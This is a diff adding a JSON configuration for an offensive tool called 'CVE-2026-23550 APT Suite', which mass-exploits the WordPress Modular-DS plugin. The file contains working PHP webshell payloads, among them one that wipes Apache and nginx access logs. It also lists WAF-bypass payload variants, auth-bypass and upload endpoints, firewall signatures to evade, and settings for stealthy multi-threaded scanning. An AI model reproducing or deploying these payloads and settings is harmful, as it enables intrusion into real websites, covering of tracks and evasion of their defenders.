@@ -1,0 +1,198 @@
+{
+  "project": {
+    "name": "CVE-2026-23550 APT Suite",
+    "version": "2.1.0",
+    "description": "Advanced Persistent Threat Framework for Modular-DS Exploitation",
+    "author": "CYBERDUDEBIVASH | W.P.E.F",
+    "date": "2026-02-07",
+    "environment": "production"
+  },
+  "settings": {
+    "execution": {
+      "default_threads": 100,
+      "max_threads": 250,
+      "timeout": 15,
+      "stealth_mode": true,
+      "stealth_delay": {
+        "min": 1.8,
+        "max": 4.2
+      },
+      "retry_attempts": 3,
+      "user_agent_rotation": true,
+      "proxy_rotation": false,
+      "concurrency_limit": 50
+    },
+    "output": {
+      "verbose": true,
+      "colorized": true,
+      "logging": true
+    }
+  },
+  "files": {
+    "input": {
+      "targets": "chain/input/targets.txt",
+      "proxies": "chain/input/proxies.txt",
+      "wordlist": "wordlist_modular-ds.txt",
+      "bypass_payloads": "bypass_payloads.txt"
+    },
+    "output": {
+      "vulnerable": "chain/VLUN/VLUN.txt",
+      "shells": "chain/VLUN_Sh/VLUN_Sh.txt",
+      "results": "chain/results.json",
+      "docked": "chain/docked/docked_targets.json",
+      "log": "chain/logs/exploit.log",
+      "stats": "chain/stats.json"
+    }
+  },
+  "payloads": {
+    "recon": [
+      {
+        "name": "version_check",
+        "payload": "<?php echo phpversion(); ?>",
+        "type": "php",
+        "obfuscated": false
+      }
+    ],
+    "exploit": [
+      {
+        "name": "basic_shell",
+        "payload": "<?php echo 'W.P.E.F|Poloss'; ?>",
+        "type": "php",
+        "obfuscated": false,
+        "size": 28,
+        "description": "Basic identification payload"
+      },
+      {
+        "name": "system_shell",
+        "payload": "<?php system($_GET['cmd']); ?>",
+        "type": "php",
+        "obfuscated": false,
+        "size": 34,
+        "description": "Basic command execution shell",
+        "parameters": {
+          "cmd": "Command to execute"
+        }
+      },
+      {
+        "name": "assert_shell",
+        "payload": "<?php assert($_POST['p']); ?>",
+        "type": "php",
+        "obfuscated": false,
+        "size": 31,
+        "description": "POST-based command execution",
+        "parameters": {
+          "p": "Command to execute"
+        }
+      }
+    ],
+    "advanced": [
+      {
+        "name": "advanced_webshell",
+        "payload": "<?php /* Advanced Webshell v4.2 */ $password = "MyS3cr3tP@ss123!"; if (!isset($_GET['pass']) || xor_encrypt($_GET['pass'], $password) !== xor_encrypt("OK", $password)) { die("Access denied"); } if (isset($_GET['cmd'])) { $cmd = base64_decode($_GET['cmd']); $output = shell_exec($cmd); echo "<pre>" . htmlspecialchars($output) . "</pre>"; } function xor_encrypt($str, $key) { $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= $str[$i] ^ $key[$i % strlen($key)]; } return $out; } ?>",
+        "type": "php",
+        "obfuscated": true,
+        "size": 456,
+        "description": "Advanced XOR-encrypted webshell with command execution",
+        "features": ["authentication", "obfuscation", "command execution"]
+      },
+      {
+        "name": "embedded_webshell",
+        "payload": "<?php class EpSiLoN { public static function execute($cmd) { $tmp_file = '/dev/shm/' . uniqid('EpSiLoN_'); file_put_contents($tmp_file, '<?php system("' . addslashes($cmd) . '"); ?>'); $output = shell_exec('php ' . $tmp_file); unlink($tmp_file); return $output; } public static function wipeLogs() { $logFiles = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']; foreach ($logFiles as $log) { if (file_exists($log)) { file_put_contents($log, ''); @touch($log, time() - 86400); } } } } if (isset($_GET['pass']) && $_GET['pass'] === 'EpSiLoNPoInT_2026!') { if (isset($_GET['cmd'])) { echo EpSiLoN::execute($_GET['cmd']); EpSiLoN::wipeLogs(); } } ?>",
+        "type": "php",
+        "obfuscated": true,
+        "size": 684,
+        "description": "Advanced embedded webshell with fileless execution and log wiping",
+        "features": ["authentication", "fileless execution", "log wiping"]
+      }
+    ],
+    "bypass": [
+      {
+        "name": "waf_bypass_1",
+        "payload": "<?php @ev'+'al($_GET[p]);?>",
+        "type": "php",
+        "description": "WAF bypass using string concatenation"
+      },
+      {
+        "name": "waf_bypass_2",
+        "payload": "<?p'+'hp system(base64_decode($_GET[c]));?>",
+        "type": "php",
+        "description": "WAF bypass using double string split"
+      },
+      {
+        "name": "waf_bypass_3",
+        "payload": "<?=strrev("alp_evas_")($_GET[a])?>",
+        "type": "php",
+        "description": "WAF bypass using string reversal"
+      }
+    ]
+  },
+  "endpoints": {
+    "recon": [
+      "/wp-content/plugins/modular-ds/readme.txt",
+      "/wp-content/plugins/modular-ds/",
+      "/api/modular-connector/login/",
+      "/wp-json/modular-connector/v1/"
+    ],
+    "exploit": [
+      "/wp-admin/admin-ajax.php?action=modular_ds_auth_bypass",
+      "/api/modular-connector/login/?origin=mo",
+      "/wp-json/modular-connector/v1/login/"
+    ],
+    "upload": [
+      "/wp-content/plugins/modular-ds/uploader.php",
+      "/wp-admin/admin-ajax.php?action=modular_ds_upload",
+      "/wp-content/plugins/modular-ds/admin/upload-handler.php"
+    ]
+  },
+  "waf_signatures": [
+    "403 Forbidden",
+    "blocked",
+    "cloudflare",
+    "mod_security",
+    "gf_waf",
+    "wordfence",
+    "sucuri",
+    "shieldsecurity",
+    "awaf",
+    "imperva"
+  ],
+  "risk_scoring": {
+    "wordpress_detected": 10,
+    "plugin_detected": 40,
+    "vulnerable_version": 50,
+    "endpoints_found": 20,
+    "waf_detected": -30,
+    "max_score": 100,
+    "min_score": 0
+  },
+  "exploitation": {
+    "methods": [
+      {
+        "name": "direct_exploit",
+        "description": "Direct privilege escalation via modular_ds_auth_bypass",
+        "priority": 1
+      },
+      {
+        "name": "upload_shell",
+        "description": "Upload webshell via plugin uploader",
+        "priority": 2
+      },
+      {
+        "name": "cron_injection",
+        "description": "WP Cron job injection",
+        "priority": 3
+      }
+    ],
+    "success_markers": [
+      "W.P.E.F|Poloss",
+      "EpSiLoNPoInT_2026!",
+      "EpSiLoNF7_ROOT"
+    ],
+    "timeout_sequence": [5, 10, 15],
+    "waf_evade": {
+      "fragmentation": true,
+      "double_encode": true,
+      "case_manipulation": true
+    }
+  }
+}
